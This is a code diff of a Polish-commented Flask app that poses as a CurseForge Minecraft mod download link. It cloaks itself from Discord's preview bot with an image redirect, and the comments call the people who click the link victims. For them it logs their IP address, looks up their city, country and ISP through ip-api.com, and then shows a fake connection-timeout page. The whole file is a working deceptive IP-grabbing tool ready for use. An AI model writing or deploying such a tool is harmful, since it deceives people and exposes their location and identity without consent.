@@ -1,39 +1,45 @@
-from flask import Flask, request, redirect, make_response
+from flask import Flask, request, make_response
 import requests
 import sys
 
 app = Flask(__name__)
 
 # --- KONFIGURACJA ---
-# Nowy obrazek błędu (ten który prosiłeś - "Failed to load")
+# Obrazek błędu dla bota Discorda
 ERROR_IMG = "https://i.imgur.com/8YvYv9S.png" 
-# Prawdziwy link CurseForge, żeby ofiara tam trafiła po logowaniu
-FINAL_DESTINATION = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"
 
-@app.route('/minecraft/mc-mods/download/7401617') # Długa ścieżka dla realizmu
+# Ścieżka nasladująca CurseForge
+@app.route('/www.curseforge.com/minecraft/mc-mods/7401617')
 def logger():
     ua = request.headers.get('User-Agent', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
-    # Jeśli to bot Discorda - pokazujemy mu błąd obrazka
+    # Obsługa bota Discorda (podgląd obrazka)
     if "Discordbot" in ua or "externalhit" in ua.lower():
-        response = make_response(redirect(ERROR_IMG))
+        response = make_response("", 302)
+        response.headers['Location'] = ERROR_IMG
         response.headers['Content-Type'] = 'image/png'
         return response
 
-    # --- LOGOWANIE DANYCH ---
-    # Wymuszamy wypisanie logów natychmiast
-    print(f"\n[!!!] KLIKNIĘCIE: {ip}", flush=True)
+    # LOGOWANIE DANYCH (z natychmiastowym wypchnięciem do konsoli)
+    print(f"\n[!!!] OFIARA WESZŁA W LINK [!!!]", flush=True)
+    print(f"IP: {ip}", flush=True)
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
         if r.get("status") == "success":
             print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
             print(f"ISP: {r.get('isp')}", flush=True)
-    except Exception as e:
-        print(f"Błąd logowania: {e}", flush=True)
+    except: pass
+    sys.stdout.flush()
 
-    # PRZEKIEROWANIE DO CURSEFORGE
-    return redirect(FINAL_DESTINATION)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    # Zamiast teleportacji - zostajemy na stronie z błędem
+    return '''
+    <html>
+        <body style="background-color: black; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+            <div style="text-align: center;">
+                <p style="font-size: 20px;">Error: Connection timed out.</p>
+                <p style="color: #555;">Please refresh the page or try again later.</p>
+            </div>
+        </body>
+    </html>
+    ''', 504 # Kod 504 sugeruje błąd połączenia
